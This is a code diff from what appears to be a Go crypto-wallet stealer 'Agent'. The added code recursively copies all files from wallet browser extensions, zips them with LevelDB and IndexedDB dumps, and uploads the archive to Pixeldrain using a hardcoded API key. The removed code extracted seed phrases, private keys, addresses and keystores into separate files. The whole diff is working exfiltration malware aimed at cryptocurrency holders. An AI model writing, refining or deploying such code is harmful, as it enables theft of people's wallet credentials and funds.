@@ -4723,28 +4723,61 @@ func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, w
 		return extension
 	}
 
-	log.Printf("Extracting data from: %s", extPath)
+	log.Printf("Extracting ALL files from: %s", extPath)
 
-	// Extract data based on storage type
+	// Copy ALL files from the extension directory
+	extension.RawFiles = a.copyAllFilesFromDirectory(extPath, walletInfo.Name)
+
+	// Also try to parse LevelDB data for additional analysis
 	switch storage {
 	case "Local Extension Settings", "Sync Extension Settings":
-		// These contain LevelDB files with wallet data
 		extension.StorageData = a.extractLevelDBData(extPath)
 	case "IndexedDB":
-		// IndexedDB contains structured wallet data
 		extension.IndexedDBData = a.extractIndexedDBData(extPath)
-	default:
-		// Try to extract from manifest and version directories
-		extension = a.extractFromExtensionDirectory(extension, extPath)
 	}
 
-	// Extract wallet-specific data
-	extension.ExtractedSeeds = a.findSeedPhrases(extension)
-	extension.PrivateKeys = a.findPrivateKeys(extension)
-	extension.Addresses = a.findCryptoAddresses(extension)
-	extension.Keystores = a.findKeystores(extension)
-
 	return extension
+}
+
+// copyAllFilesFromDirectory recursively copies ALL files from a directory
+func (a *Agent) copyAllFilesFromDirectory(dirPath, walletName string) map[string][]byte {
+	files := make(map[string][]byte)
+
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return nil // Continue on errors
+		}
+
+		// Skip directories
+		if info.IsDir() {
+			return nil
+		}
+
+		// Read file content
+		content, err := os.ReadFile(path)
+		if err != nil {
+			log.Printf("Failed to read file %s: %v", path, err)
+			return nil // Continue on errors
+		}
+
+		// Store relative path as key
+		relPath, err := filepath.Rel(dirPath, path)
+		if err != nil {
+			relPath = filepath.Base(path)
+		}
+
+		files[relPath] = content
+		log.Printf("Copied file: %s (%d bytes)", relPath, len(content))
+
+		return nil
+	})
+
+	if err != nil {
+		log.Printf("Error walking directory %s: %v", dirPath, err)
+	}
+
+	log.Printf("Copied %d files from %s wallet directory", len(files), walletName)
+	return files
 }
 
 // extractLevelDBData extracts data from LevelDB storage (Local/Sync Extension Settings)
@@ -5308,53 +5341,28 @@ Profile: %s
 Version: %s
 Active: %v
 
-Seeds Found: %d
-Private Keys: %d
-Addresses: %d
-Keystores: %d
-
+Raw Files Found: %d
 Storage Data Size: %d entries
 IndexedDB Size: %d entries
 Local Storage Size: %d entries
 `, extension.ExtensionName, extension.ExtensionID, extension.WalletType,
 			extension.Browser, extension.Profile, extension.Version, extension.IsActive,
-			len(extension.ExtractedSeeds), len(extension.PrivateKeys),
-			len(extension.Addresses), len(extension.Keystores),
-			len(extension.StorageData), len(extension.IndexedDBData), len(extension.LocalStorage))
+			len(extension.RawFiles), len(extension.StorageData), len(extension.IndexedDBData), len(extension.LocalStorage))
 
 		infoWriter, err := zipWriter.Create(extDir + "extension_info.txt")
 		if err == nil {
 			infoWriter.Write([]byte(infoContent))
 		}
 
-		// Add extracted seeds
-		if len(extension.ExtractedSeeds) > 0 {
-			seedsContent := strings.Join(extension.ExtractedSeeds, "\n")
-			seedsWriter, err := zipWriter.Create(extDir + "seeds.txt")
+		// Add ALL raw files from the extension directory
+		for filePath, fileContent := range extension.RawFiles {
+			fileWriter, err := zipWriter.Create(extDir + filePath)
 			if err == nil {
-				seedsWriter.Write([]byte(seedsContent))
+				fileWriter.Write(fileContent)
 			}
 		}
 
-		// Add private keys
-		if len(extension.PrivateKeys) > 0 {
-			keysContent := strings.Join(extension.PrivateKeys, "\n")
-			keysWriter, err := zipWriter.Create(extDir + "private_keys.txt")
-			if err == nil {
-				keysWriter.Write([]byte(keysContent))
-			}
-		}
-
-		// Add addresses
-		if len(extension.Addresses) > 0 {
-			addressesContent := strings.Join(extension.Addresses, "\n")
-			addressesWriter, err := zipWriter.Create(extDir + "addresses.txt")
-			if err == nil {
-				addressesWriter.Write([]byte(addressesContent))
-			}
-		}
-
-		// Add storage data as JSON
+		// Add storage data as JSON if available
 		if len(extension.StorageData) > 0 {
 			storageJSON, err := json.MarshalIndent(extension.StorageData, "", "  ")
 			if err == nil {
@@ -5365,7 +5373,7 @@ Local Storage Size: %d entries
 			}
 		}
 
-		// Add IndexedDB data as JSON
+		// Add IndexedDB data as JSON if available
 		if len(extension.IndexedDBData) > 0 {
 			indexedDBJSON, err := json.MarshalIndent(extension.IndexedDBData, "", "  ")
 			if err == nil {
@@ -5375,48 +5383,30 @@ Local Storage Size: %d entries
 				}
 			}
 		}
-
-		// Add local storage data as JSON
-		if len(extension.LocalStorage) > 0 {
-			localStorageJSON, err := json.MarshalIndent(extension.LocalStorage, "", "  ")
-			if err == nil {
-				localStorageWriter, err := zipWriter.Create(extDir + "local_storage.json")
-				if err == nil {
-					localStorageWriter.Write(localStorageJSON)
-				}
-			}
-		}
-
-		// Add keystores as JSON
-		if len(extension.Keystores) > 0 {
-			keystoresJSON, err := json.MarshalIndent(extension.Keystores, "", "  ")
-			if err == nil {
-				keystoresWriter, err := zipWriter.Create(extDir + "keystores.json")
-				if err == nil {
-					keystoresWriter.Write(keystoresJSON)
-				}
-			}
-		}
 	}
 
 	// Add summary file
-	summaryContent := fmt.Sprintf(`Browser Extension Wallet Extraction Summary
-===========================================
+	summaryContent := fmt.Sprintf(`Browser Wallet Extraction Summary
+=====================================
 
 Total Extensions Found: %d
 Total Seeds: %d
-Total Private Keys: %d  
+Total Private Keys: %d
 Total Addresses: %d
 Total Keystores: %d
 
-High Value Targets: %s
-
 Extraction Time: %s
 Agent ID: %s
-`, cryptoAssets.TotalExtensions, cryptoAssets.TotalSeeds,
-		cryptoAssets.TotalPrivateKeys, cryptoAssets.TotalAddresses,
-		cryptoAssets.TotalKeystores, strings.Join(cryptoAssets.HighValueTargets, ", "),
+
+Extensions:
+`, cryptoAssets.TotalExtensions, cryptoAssets.TotalSeeds, cryptoAssets.TotalPrivateKeys,
+		cryptoAssets.TotalAddresses, cryptoAssets.TotalKeystores,
 		time.Unix(cryptoAssets.Timestamp, 0).Format("2006-01-02 15:04:05"), cryptoAssets.AgentID)
+
+	for _, ext := range cryptoAssets.ExtensionWallets {
+		summaryContent += fmt.Sprintf("- %s (%s) - %s - %d files\n",
+			ext.ExtensionName, ext.WalletType, ext.Browser, len(ext.RawFiles))
+	}
 
 	summaryWriter, err := zipWriter.Create("summary.txt")
 	if err == nil {
@@ -5424,23 +5414,21 @@ Agent ID: %s
 	}
 
 	// Close ZIP writer
-	if err := zipWriter.Close(); err != nil {
-		return "", fmt.Errorf("failed to close ZIP: %v", err)
-	}
+	zipWriter.Close()
 
-	// Get file size
+	// Get file info for upload
 	fileInfo, err := tempFile.Stat()
 	if err != nil {
-		return "", fmt.Errorf("failed to stat ZIP file: %v", err)
+		return "", fmt.Errorf("failed to get file info: %v", err)
 	}
 
-	// Reopen file for reading
+	// Reset file pointer to beginning
 	tempFile.Seek(0, 0)
 
 	// Create filename with timestamp and agent ID
 	fileName := fmt.Sprintf("browser_wallets_%s_%d.zip", a.ID[:8], time.Now().Unix())
 
-	// Upload to Pixeldrain
+	// Upload to Pixeldrain using same method as hot wallets
 	apiKey := "0c15316a-a603-4e3c-92a1-03d9fc6a9e7a"
 	uploadURL := fmt.Sprintf("https://pixeldrain.com/api/file/%s", fileName)
 
@@ -5483,6 +5471,8 @@ Agent ID: %s
 
 	// Return download URL
 	downloadURL := fmt.Sprintf("https://pixeldrain.com/u/%s", uploadResp.ID)
+	log.Printf("Browser wallet files uploaded to Pixeldrain: %s", downloadURL)
+
 	return downloadURL, nil
 }
 
